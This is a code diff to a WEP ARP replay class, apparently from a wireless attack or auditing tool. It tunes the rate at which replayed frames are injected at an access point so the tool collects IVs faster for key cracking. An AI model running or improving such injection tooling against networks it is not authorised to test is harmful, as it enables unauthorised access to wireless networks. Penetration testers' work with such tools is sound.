@@ -72,6 +72,8 @@ class WepArpReplay:
 
     # P&O rate controller over 1s windows. objective = IVs gained that second.
     _WINDOW_S = 1.0
+    _RX_DUTY = 0.7          # cap the TX burst at this fraction of the window; the remainder is
+                            # guaranteed RX airtime so the AP's rebroadcasts (our IVs) are received.
     _PO_STEP_PPS = 32.0
     _PO_START_PPS = 100.0
     _PO_MIN_PPS = 20.0
@@ -140,10 +142,7 @@ class WepArpReplay:
         self._active = True
         self.stats = ArpReplayStats()
         # Fresh P&O search each session.
-        self._rate = self._PO_START_PPS
-        self._rate_step = self._PO_STEP_PPS
-        self._po_prev_ivs_s = -1.0
-        self._ivs_ewma = -1.0
+        self._reset_rate_search()
         self._echoes = 0
         # Watch for the AP echoing our replays back: the "replayable" signal.
         self.iface.register_rx_callback(self._rx_cb)
@@ -291,6 +290,13 @@ class WepArpReplay:
     async def _burst_window(self, cand: bytes) -> int:
         """One 1-second window: blast ``rate`` packets at the card's full speed,
         then sleep out the rest of the second while the AP's rebroadcasts land."""
+        # Never let the burst eat more than _RX_DUTY of the window: the remainder is the RX
+        # airtime the AP's rebroadcasts (our IVs) need, and without it rx_reader drops them at
+        # its pending cap. raw_pps is the card's measured accept rate (0 on the very first window);
+        # the cap only applies to a real-time window (WINDOW_S>0), and never drops below 1 frame.
+        if self.stats.raw_pps > 0 and self._WINDOW_S > 0:
+            cap = self._RX_DUTY * self._WINDOW_S * self.stats.raw_pps
+            self._rate = max(1.0, min(self._rate, cap))
         frame = self._build_replay_frame(cand)
         if frame is None:
             # Malformed capture: blacklist and move on.
@@ -355,6 +361,7 @@ class WepArpReplay:
                 self._winner = None
                 self._current = None
                 self.stats.has_winner = False
+                self._reset_rate_search()   # don't leave the next search pinned at a high rate
             return
 
         # Testing a candidate: it's replayable once the AP has echoed it _MIN_TRIAL_GAIN.
@@ -381,6 +388,14 @@ class WepArpReplay:
                 "[dim](AP never echoed it)[/dim]"
             ))
 
+    def _reset_rate_search(self) -> None:
+        """Reset the P&O rate controller to its start state. Used by start() and on winner-demote
+        so a stalled session re-searches from a low rate instead of staying pinned high."""
+        self._rate = self._PO_START_PPS
+        self._rate_step = self._PO_STEP_PPS
+        self._po_prev_ivs_s = -1.0
+        self._ivs_ewma = -1.0
+
     def _maybe_adjust_rate(self) -> None:
         """Perturb-and-observe step, run once per 1s window"""
         if self.state != "replaying":
@@ -392,8 +407,12 @@ class WepArpReplay:
         if self._po_prev_ivs_s < 0:
             self._po_prev_ivs_s = measured   # first window: just set baseline
         else:
-            # Reverse only on a real drop (deadband absorbs window noise).
-            if measured < self._po_prev_ivs_s * (1.0 - self._PO_IMPROVE_EPS):
+            # Hill-climb: keep stepping the same direction ONLY while IVs/s genuinely improve.
+            # A flat or falling objective (including a dead 0) turns around, so we never chase a
+            # non-responsive AP up to max pps and starve our own RX window (0 < 0 used to never
+            # trip the old drop-only test, ramping monotonically to the cap).
+            improved = measured > self._po_prev_ivs_s * (1.0 + self._PO_IMPROVE_EPS)
+            if not improved:
                 self._rate_step = -self._rate_step
             self._po_prev_ivs_s = measured
         self._rate = min(
